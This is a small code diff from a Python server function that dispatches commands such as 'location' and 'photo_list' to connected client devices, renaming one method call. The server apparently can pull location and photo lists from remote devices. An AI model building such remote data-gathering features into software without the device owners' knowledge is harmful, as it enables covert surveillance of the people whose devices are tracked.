@@ -320,7 +320,7 @@ def send_to_device(ident, cmd):
                     elif cmd == "location":
                         CHAT_CLIENT_LIST[sock_fd].request_client_location()
                     elif cmd == "photo_list":
-                        CHAT_CLIENT_LIST[sock_fd].request_photo_list()
+                        CHAT_CLIENT_LIST[sock_fd].request_client_photo_list()
                     else:
                         CHAT_CLIENT_LIST[sock_fd].send_command(cmd)
                 except socket.error as err:
